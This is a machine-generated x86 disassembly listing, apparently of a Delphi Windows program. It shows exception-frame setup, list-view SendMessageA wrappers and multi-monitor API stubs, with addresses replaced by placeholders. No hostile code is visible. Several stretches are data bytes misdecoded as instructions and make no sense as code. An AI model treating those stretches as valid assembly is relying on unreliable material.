pop ebx
retn
sub_42a3dc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42a401
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a408
retn
sub_42a41c
cmp [ rw-data ] 0x0
jne r-xdata
retn
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_42a47c
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_42a41c
xor eax eax
jmp r-xdata
push ebx
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebx
retn
mov al 0x1
sub_42a570
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x1203
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42a5c4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
push 0x1003
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42a668
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor edx edx
mov eax edi
call sub_406c64
push eax
push esi
push 0x100c
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42a69c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
push 0x0
push edi
push 0x100e
push esi
call SendMessageA
mov eax [ ebp + 0x8 ]
mov [ ebx ] eax
push ebx
push edi
push 0x100e
push esi
call SendMessageA
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_42a6e8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x1015
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42a730
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x101a
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42a78c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor edx edx
mov eax edi
call sub_406c64
push eax
push esi
push 0x101e
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42a7b0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x1021
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42a824
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x102a
push ebx
call SendMessageA
test eax eax
setne al
neg al
sbb eax eax
pop esi
pop ebx
retn
sub_42a844
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] ecx
lea eax [ ebp - 0x28 ]
push eax
push esi
push 0x102b
push ebx
call SendMessageA
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42a884
push ebx
push esi
mov esi edx
mov ebx eax
push 0xf000
push esi
push 0x102c
push ebx
call SendMessageA
shr eax 0xc
dec eax
pop esi
pop ebx
retn
sub_42a8a4
add esp 0xffffffd8
mov [ esp + 0x10 ] 0xf000
and ecx 0x1
inc ecx
shl ecx 0xc
mov [ esp + 0xc ] ecx
mov ecx esp
push ecx
push edx
push 0x102b
push eax
call SendMessageA
add esp 0x28
retn
sub_42a8d0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebp - 0x20 ] ecx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x28 ]
push eax
push esi
push 0x102e
push ebx
call SendMessageA
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42a920
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
push 0x1030
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42a964
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x103a
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42a980
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x103b
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42a99c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x1041
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42aa28
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x1002
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42aa44
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x1004
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42aa60
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x1006
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42aa8c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42aab1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42aab8
retn
sub_42aac4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_40455c
xor eax eax
push ebp
push sub_42ab83
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
xor eax eax
mov al bl
cmp [ eax + rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ab8a
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
cmp [ rw-data ] 0x0
je r-xdata
xor esi esi
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov esi edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40456c
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov al bl
mov [ eax + rw-data ] 0x1
mov [ rw-data ] 0x1
test esi esi
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_42aac4
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_4040ac
sub_42abac
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
mov edx ebx
add edx 0xffffffb4
sub edx 0x2
jb r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
xor eax eax
call sub_42aac4
mov [ rw-data ] eax
push ebx
call [ rw-data ]
jmp r-xdata
xor eax eax
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
cmp eax 0xffffffff
jne r-xdata
xor ebx ebx
jmp r-xdata
dec edx
je r-xdata
push ebx
call GetSystemMetrics
mov ebx 0x1
dec edx
sub edx 0x2
jae r-xdata
mov eax 0x1
jmp r-xdata
sub_42ac34
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor esi esi
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x2
call sub_42aac4
mov [ rw-data ] eax
push edi
push ebx
call [ rw-data ]
mov esi eax
jmp r-xdata
mov esi 0x12340042
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebx + 0xc ] 0x0
jle r-xdata
push 0x0
call [ rw-data ]
cmp eax [ ebx ]
jle r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebx + 0x4 ]
jle r-xdata
sub_42acc4
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
and eax 0x3
test al al
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x1
call sub_42aac4
mov [ rw-data ] eax
push ebx
push esi
call [ rw-data ]
jmp r-xdata
push esi
call IsIconic
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetWindowPlacement
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_42ac34
sub_42ad5a
add [ eax ] al
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x3
call sub_42aac4
mov [ rw-data ] eax
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov ebx 0x12340042
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push 0x0
call [ rw-data ]
cmp esi eax
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_42addb
call [ eax ]
add [ eax ] al
add [ ebp + 0x6f ] cl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x6d6f7246
push eax
outsd
imul ebp [ esi + 0x74 ] 0x0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_42aac4
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42aec8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x5
call sub_42aac4
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42af9c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x6
call sub_42aac4
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42b070
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x7
call sub_42aac4
mov [ rw-data ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
push 0x0
call [ rw-data ]
mov [ ebp - 0x14 ] eax
push 0x1
call [ rw-data ]
mov [ ebp - 0x10 ] eax
test esi esi
je r-xdata
test edi edi
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetClipBox
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push esi
call GetDCOrgEx
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push 0x12340042
call [ ebp + 0x10 ]
mov ebx eax
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
neg eax
push eax
mov eax [ ebp - 0x8 ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x1
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_42b20b
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42b231
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b238
retn
sub_42b24c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b271
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b278
retn
sub_42b284
mov [ edx + 0xd0f0042 ] dh
dec ecx
dec eax
insb
dec eax
insb
jo r-xdata
insb
arpl [ gs : edi + ebp * 2 + 0x72 ] si
and al 0x11
inc eax
add [ ecx ] al
pop eax
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc ecx [ ecx + 0x45 ]
outsb
je r-xdata
push [ eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b278
retn
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
inc edx
outsb
dec eax
insb
adc [ ebx + 0x4fc000b9 ] esp
jae r-xdata
outsd
outsb
je r-xdata
mov ah 0x42
popad
outsb
popad
jb r-xdata
lodsd [ esi ]
jns r-xdata
imul esp [ ebp + 0x77 ] 0xb2f07265
inc edx
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add [ edi ] cl
adc [ ecx + 0x43 ] ecx
jne r-xdata
add bh bh
push esp
mov dl 0x42
lodsd [ esi ]
imul esp [ ebp + 0x77 ] 0x11247265
inc eax
add [ ecx ] al
xchg ebx eax
cld
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
jae r-xdata
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0xe004032 ] ah
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al dh
mov dl 0x42
jns r-xdata
add [ eax + eax ] cl
add [ eax ] al
push 0xe0004072
add [ esp + esi * 4 ] ch
adc [ eax ] eax
add [ esi - 0x6d ] esp
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi * 4 ] ch
inc edx
outsb
je r-xdata
js r-xdata
xor [ ebx + 0x130f0042 ] dh
dec ecx
inc ebp
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc [ eax ] eax
add [ ebx + edx * 4 - 0x4 ] esp
add [ edi ] cl
or al 0x49
dec eax
insb
jo r-xdata
mov bl 0x42
outsb
je r-xdata
adc eax 0x65705349
arpl [ ecx + 0x61 ] bp
insb
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
je r-xdata
jns r-xdata
add [ edi ] cl
outsb
je r-xdata
dec [ ebx + 0x42b2c0c0 ]
add [ edi ] cl
or ecx [ ecx + 0x48 ]
insb
jo r-xdata
add bh bh
xor [ edx ] ecx
add [ eax ] al
add eax 0xffffffd4
jmp r-xdata
imul esp [ ebp + 0x77 ] 0x6f4e7265
mov eax eax
push esi
je r-xdata
insb
jo r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x72 ] ch
inc eax
add al ah
jae r-xdata
jns r-xdata
add al al
dec edi
jae r-xdata
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
insd
dec eax
insb
jo r-xdata
jo r-xdata
insb
je r-xdata
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
jae r-xdata
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42c017
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
add [ eax + eax ] al
inc edx
insd
inc ebp
js r-xdata
dec ecx
imul esp [ ebp + 0x77 ] 0xb32c7265
inc edx
add [ ecx ] al
xchg bx ax
cld
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x14004032 ] ah
inc ebp
dec eax
insb
jo r-xdata
inc eax
outsb
je r-xdata
add bh bh
dec [ ebx + 0x42b3acc0 ]
mov bl 0x42
add bh bh
[ ebx + esi * 4 + 0x42 ]
add [ ecx ] al
xchg bx ax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
mov dl 0x42
insd
and al 0x11
inc eax
add [ ecx ] al
push ebx
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
movlps [ ecx + 0x45 ] xmm1
add bh bh
dec [ ebx + 0x42b330c0 ]
add [ edi ] cl
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_404100
add [ eax ] al
andps xmm1 [ eax + 0x65 ]
insb
jo r-xdata
add al 0x0
jo r-xdata
imul ebp [ edi + 0x6e ] 0x9000408d
mov ah 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x42b4 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0xc0042b4 ] ah
add [ eax ] al
add [ eax - 0x1fffbff0 ] dh
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
jae r-xdata
jo r-xdata
cmp cl [ ecx ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb98
call sub_403a64
jmp r-xdata
int3
mov eax eax
inc edx
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
sub al 0xb4
add bh bh
dec [ ebp - 0x4bd3ffc0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c01e
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404b54
lea eax [ ebp - 0x8 ]
call sub_405944
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405988
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_42a2c8
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_40595c
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405988
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_42b648
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_42b6be
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
mov [ eax ] edx
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ rw-data ]
call sub_42b7d4
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40595c
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b6c5
lea eax [ ebp - 0x8 ]
call sub_405944
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b760
mov [ rw-data ] eax
sub_42b6cc
push ebp
mov ebp esp
push ebx
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov [ ebx ] eax
mov eax ebx
mov edx [ rw-data ]
test edx edx
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b760
mov [ rw-data ] eax
mov ecx r-xdata
call sub_405988
xor eax eax
pop ebx
pop ebp
retn
sub edx 0xfffffff8
sub_42b724
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_40595c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_42b760
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403280
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a28c
mov [ esi + 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a28c
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a28c
mov [ esi + 0x18 ] eax
lea eax [ esi + 0x24 ]
call sub_4040ac
mov [ esi + 0x1c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_42b7d4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42b8d5
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b724
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x10 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_42a2dc
mov edx [ esi + 0x8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x24 ]
lea eax [ ebp - 0x8 ]
call sub_405944
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40d574
test al al
je r-xdata
lea eax [ ebp - 0xc ]
call sub_405944
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40d574
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b724
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x14 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_42a2dc
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx ebx
test edx edx
je r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b724
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x18 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_42a2dc
mov ecx r-xdata
call sub_405988
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b8dc
lea eax [ ebp - 0xc ]
call sub_405944
lea eax [ ebp - 0x8 ]
call sub_405944
retn
sub edx 0xfffffff8
sub_42b8f4
push ebx
push esi
push edi
mov ebx eax
jmp r-xdata
mov esi [ ebx + 0x10 ]
mov edi [ esi + 0x8 ]
test edi edi
jg r-xdata
mov edx edi
dec edx
mov eax esi
call sub_42a2c8
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop edi
pop esi
pop ebx
retn
sub_42b934
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x10 ]
mov edx esi
call sub_42a2c8
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
inc esi
dec ebx
jne r-xdata
sub_42b964
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42baf6
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x1
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax esi
xor edx edx
call sub_42a2c8
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x0
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42ba91
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bafd
